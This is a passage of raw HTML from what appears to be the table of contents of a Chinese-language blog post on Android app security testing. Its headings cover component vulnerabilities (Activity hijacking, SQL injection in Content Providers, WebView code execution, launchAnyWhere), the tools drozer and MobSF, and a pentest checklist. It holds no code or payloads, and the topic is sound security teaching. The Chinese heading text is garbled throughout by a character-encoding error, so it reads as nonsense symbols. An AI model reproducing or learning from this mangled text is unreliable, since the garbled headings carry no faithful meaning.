class="toc-text">Intentæ•æ„Ÿæ•°æ®æ³„éœ²é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PendingIntent%E8%AF%AF%E7%94%A8%E9%A3%8E%E9%99%A9"><span class="toc-text">PendingIntentè¯¯ç”¨é£é™©</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">å¯†é’¥ç¡¬ç¼–ç é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%88%96%E7%A8%8B%E5%BA%8F%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%9F%A5"><span class="toc-text">æ•°æ®æˆ–ç¨‹åºåŠ è½½æ£€æŸ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BASE64%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">BASE64å®‰å…¨æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%85%A8%E5%B1%80%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">æ–‡ä»¶å…¨å±€è¯»å†™æ¼æ´æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E6%B3%84%E9%9C%B2%E9%A3%8E%E9%99%A9%E6%A3%80%E6%B5%8B"><span class="toc-text">æ—¥å¿—æ³„éœ²é£é™©æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%8A%A0%E8%BD%BDdex%E6%A3%80%E6%B5%8B"><span class="toc-text">å¤–éƒ¨åŠ è½½dexæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%AD%98%E5%82%A8%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B"><span class="toc-text">å¤–éƒ¨å­˜å‚¨è·¯å¾„æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E9%A3%8E%E9%99%A9"><span class="toc-text">æ˜æ–‡æ•°å­—è¯ä¹¦é£é™©</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A3%80%E6%B5%8B"><span class="toc-text">æ•æ„Ÿå‡½æ•°è°ƒç”¨æ£€æµ‹</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E5%87%BD%E6%95%B0%E6%A3%80%E6%B5%8B"><span class="toc-text">å®‰å…¨ç›¸å…³çš„å‡½æ•°æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E7%B1%BB%E6%A3%80%E6%B5%8B"><span class="toc-text">å®‰å…¨ç›¸å…³çš„ç±»æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%A3%80%E6%B5%8B"><span class="toc-text">è¿è¡Œå‘½ä»¤æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Native-Library%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B"><span class="toc-text">Native LibraryåŠ è½½æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E9%83%A8%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex%E6%A3%80%E6%B5%8B"><span class="toc-text">å¤–éƒ¨åŠ¨æ€åŠ è½½dexæ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">rootä»£ç æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96IMEI-%E5%92%8CDevice-ID%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">è·å–IMEI å’ŒDevice IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Android-ID%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">è·å–Android IDæ•æ„Ÿä¿¡æ¯ä»£ç æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81SMS%E6%95%8F%E6%84%9F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">å‘é€SMSæ•æ„Ÿä»£ç æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">æ–‡ä»¶åˆ é™¤ä»£ç æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#signature%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-text">signatureä»£ç æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-text">ç³»ç»Ÿæ¼æ´æ£€æµ‹</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APPä¸€äº›æ¼æ´åŸç†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Activity%E7%BB%84%E4%BB%B6%E7%9A%84%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Activityç»„ä»¶çš„ç›¸å…³æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0"><span class="toc-text">Activityæ¼æ´åŸç†åˆ†æå’Œå¤ç°</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83%E7%BB%95%E8%BF%87"><span class="toc-text">è¶Šæƒç»•è¿‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E6%AC%BA%E8%AF%88-Activity%E5%8A%AB%E6%8C%81"><span class="toc-text">é’“é±¼æ¬ºè¯ˆ&#x2F;ActivityåŠ«æŒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%90%E7%A7%81%E5%90%AF%E5%8A%A8Intent%E5%8C%85%E5%90%AB%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE"><span class="toc-text">éšç§å¯åŠ¨IntentåŒ…å«æ•æ„Ÿæ•°æ®</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-text">æ‹’ç»æœåŠ¡æ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android%E5%A4%96%E9%83%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">Androidå¤–éƒ¨ç¨‹åºçš„è°ƒç”¨æ–¹æ³•</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Service%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Serviceç»„ä»¶ç›¸å…³æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-text">serviceåŸºæœ¬ä»‹ç»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#service%E5%90%AF%E5%8A%A8"><span class="toc-text">serviceå¯åŠ¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bindService%E5%90%AF%E5%8A%A8"><span class="toc-text">bindServiceå¯åŠ¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Service%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">Serviceæ¼æ´åŸç†åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">æƒé™æå‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#service%E5%8A%AB%E6%8C%81"><span class="toc-text">serviceåŠ«æŒ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0"><span class="toc-text">æ¶ˆæ¯ä¼ªé€ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E6%8E%A5%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-text">æ‹’æ¥æœåŠ¡æ”»å‡»</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Service%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">Serviceçš„å®‰å…¨é˜²æŠ¤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BroadcastReceiver%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">BroadcastReceiverç›¸å…³æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B9%BF%E6%92%AD%E6%8E%A5%E6%94%B6%E8%80%85BroadcastReceiver"><span class="toc-text">è‡ªå®šä¹‰å¹¿æ’­æ¥æ”¶è€…BroadcastReceiver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E6%92%AD%E6%8E%A5%E6%94%B6%E8%80%85%E6%B3%A8%E5%86%8C"><span class="toc-text">å¹¿æ’­æ¥æ”¶è€…æ³¨å†Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%BF%E6%92%AD%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-text">å¹¿æ’­çš„ç±»å‹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%99%AE%E9%80%9A%E5%B9%BF%E6%92%AD"><span class="toc-text">æ™®é€šå¹¿æ’­</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%B9%BF%E6%92%AD%EF%BC%9A"><span class="toc-text">ç³»ç»Ÿå¹¿æ’­ï¼š</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%89%E5%BA%8F%E5%B9%BF%E6%92%AD"><span class="toc-text">æœ‰åºå¹¿æ’­</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E5%B9%BF%E6%92%AD"><span class="toc-text">æœ¬åœ°å¹¿æ’­</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BroadcastReceiver%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">BroadcastReceiveræ¼æ´åŸç†åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">æ•æ„Ÿä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-text">æƒé™ç»•è¿‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E4%BC%AA%E9%80%A0-2"><span class="toc-text">æ¶ˆæ¯ä¼ªé€ </span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-text">æ‹’ç»æœåŠ¡</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="toc-text">å®‰å…¨é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Provider%E7%BB%84%E4%BB%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-text">Content Providerç»„ä»¶ç›¸å…³æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uri%E4%BB%8B%E7%BB%8D"><span class="toc-text">uriä»‹ç»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URI%E8%A7%A3%E6%9E%90"><span class="toc-text">URIè§£æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ContentProvider%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE"><span class="toc-text">ContentProvideræ“ä½œæ•°æ®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E6%95%B0%E6%8D%AE%E5%8F%98%E5%8C%96"><span class="toc-text">ç›‘å¬æ•°æ®å˜åŒ–</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Content-Provider%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">Content Provideræ¼æ´åŸç†åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">ä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQLæ³¨å…¥æ¼æ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">ç›®å½•éå†æ¼æ´</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webview%E6%BC%8F%E6%B4%9E"><span class="toc-text">Webviewæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebView%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">WebViewåŸºæœ¬ä½¿ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5"><span class="toc-text">æ‰“å¼€ç½‘é¡µ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E3%80%81"><span class="toc-text">è¿œç¨‹åŠ è½½ã€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%B1%BB%E4%BD%BF%E7%94%A8"><span class="toc-text">å¸¸ç”¨ç±»ä½¿ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WebSettings"><span class="toc-text">WebSettings</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WebViewClient%E7%B1%BB"><span class="toc-text">WebViewClientç±»</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#webview%E4%B8%8Ejs%E5%8A%A0%E6%8A%A4"><span class="toc-text">webviewä¸jsåŠ æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Android%E8%B0%83%E7%94%A8JS"><span class="toc-text">Androidè°ƒç”¨JS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Webview%E6%BC%8F%E6%B4%9E-2"><span class="toc-text">Webviewæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E6%A6%82%E6%8B%AC"><span class="toc-text">æ¼æ´ç±»å‹æ¦‚æ‹¬</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-text">å†å²æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Webview%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">Webviewä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#webview%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%E6%BC%8F%E6%B4%9E"><span class="toc-text">webviewæ˜æ–‡å­˜å‚¨æ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E"><span class="toc-text">è·¨åŸŸæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96-%E5%BA%94%E7%94%A8%E5%85%8B%E9%9A%86%E6%BC%8F%E6%B4%9E"><span class="toc-text">ä»»æ„æ–‡ä»¶çªƒå–(åº”ç”¨å…‹éš†æ¼æ´)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E-%E6%81%B6%E6%84%8F%E9%A1%B5%E9%9D%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">é€šç”¨åè®®æ¼æ´(æ¶æ„é¡µé¢æ³¨å…¥)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-2"><span class="toc-text">å®‰å…¨é˜²æŠ¤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB"><span class="toc-text">ç¬¦å·é“¾æ¥è·¨æºæ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-3"><span class="toc-text">å®‰å…¨é˜²æŠ¤</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93cookie"><span class="toc-text">æ±¡æŸ“cookie</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URL%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="toc-text">URLé…ç½®æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#URL%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E"><span class="toc-text">URLç»•è¿‡æ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#hearachical-Uri%E7%BB%95%E8%BF%87"><span class="toc-text">hearachical Uriç»•è¿‡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#URL-Scheme%E7%BB%95%E8%BF%87"><span class="toc-text">URL Schemeç»•è¿‡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87"><span class="toc-text">æœåŠ¡å™¨è·³è½¬æ¼æ´ç»•è¿‡</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-text">fileåè®®ç»•è¿‡</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Intent-WebView"><span class="toc-text">Intent + WebView</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Intent%E8%AE%BF%E9%97%AE%E5%AF%BC%E5%87%BA%E7%BB%84%E4%BB%B6%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%95%8C%E9%9D%A2%E5%92%8C%E7%AA%83%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-text">Intentè®¿é—®å¯¼å‡ºç»„ä»¶åŠ è½½æ¶æ„ç•Œé¢å’Œçªƒå–ä¿¡æ¯</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Intent%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%BC%E8%87%B4launchAnyWhere%E6%BC%8F%E6%B4%9E"><span class="toc-text">Intenté‡å®šå‘å¯¼è‡´launchAnyWhereæ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Deeplink-WebView%E6%BC%8F%E6%B4%9E"><span class="toc-text">Deeplink + WebViewæ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-text">ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xss%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">xssæ³¨å…¥æ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#DeepLinks%E5%9C%A8WebView%E4%B8%8A%E7%9A%84%E7%BB%84%E5%90%88%E6%BC%8F%E6%B4%9E"><span class="toc-text">DeepLinksåœ¨WebViewä¸Šçš„ç»„åˆæ¼æ´</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#loadDataWithBaseURL%E6%BC%8F%E6%B4%9E"><span class="toc-text">loadDataWithBaseURLæ¼æ´</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">å®‰å…¨åˆ†æå·¥å…·å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#drozer"><span class="toc-text">drozer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MobSF"><span class="toc-text">MobSF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">APPæ¸—é€æµ‹è¯•è¦ç‚¹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8"><span class="toc-text">å®¢æˆ·ç«¯ç¨‹åºå®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%8C%85%E7%AD%BE%E5%90%8D"><span class="toc-text">å®‰è£…åŒ…ç­¾å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91%E4%BF%9D%E6%8A%A4"><span class="toc-text">åç¼–è¯‘ä¿æŠ¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%AE%8C%E6%95%B4%E6%80%A7%E6%A0%A1%E9%AA%8C"><span class="toc-text">åº”ç”¨å®Œæ•´æ€§æ ¡éªŒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-text">ç»„ä»¶å®‰å…¨</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8"><span class="toc-text">æ•æ„Ÿä¿¡æ¯å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%96%87%E4%BB%B6"><span class="toc-text">æ•°æ®æ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Logcat%E6%97%A5%E5%BF%97"><span class="toc-text">Logcatæ—¥å¿—</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">å¯†ç å®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%94%AE%E7%9B%98%E5%8A%AB%E6%8C%81"><span class="toc-text">é”®ç›˜åŠ«æŒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E5%B8%83%E5%B1%80%E8%BD%AF%E9%94%AE%E7%9B%98"><span class="toc-text">éšæœºå¸ƒå±€è½¯é”®ç›˜</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E5%BD%95%E5%83%8F"><span class="toc-text">å±å¹•å½•åƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%BF%E5%AF%86%E7%A0%81"><span class="toc-text">æ‰‹åŠ¿å¯†ç </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="toc-text">å®‰å…¨ç­–ç•¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A4%8D%E6%9D%82%E5%BA%A6%E6%A3%80%E6%B5%8B"><span class="toc-text">å¯†ç å¤æ‚åº¦æ£€æµ‹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E7%99%BB%E5%BD%95%E9%99%90%E5%88%B6"><span class="toc-text">è´¦å·ç™»å½•é™åˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E9%94%81%E5%AE%9A%E7%AD%96%E7%95%A5"><span class="toc-text">è´¦æˆ·é”å®šç­–ç•¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E9%AA%8C%E8%AF%81"><span class="toc-text">é—®é¢˜éªŒè¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8"><span class="toc-text">ä¼šè¯å®‰å…¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%95%8C%E9%9D%A2%E5%88%87%E6%8D%A2%E4%BF%9D%E6%8A%A4"><span class="toc-text">ç•Œé¢åˆ‡æ¢ä¿æŠ¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UI%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">UIä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8"><span class="toc-text">éªŒè¯ç å®‰å…¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%80%80%E5%87%BA"><span class="toc-text">å®‰å…¨é€€å‡º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%AA%8C%E8%AF%81"><span class="toc-text">å¯†ç ä¿®æ”¹éªŒè¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Activity-%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81"><span class="toc-text">Activity ç•Œé¢åŠ«æŒ</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4"><span class="toc-text">è¿›ç¨‹ä¿æŠ¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E8%AE%BF%E9%97%AE%E5%92%8C%E4%BF%AE%E6%94%B9"><span class="toc-text">å†…å­˜è®¿é—®å’Œä¿®æ”¹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5"><span class="toc-text">åŠ¨æ€æ³¨å…¥</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8"><span 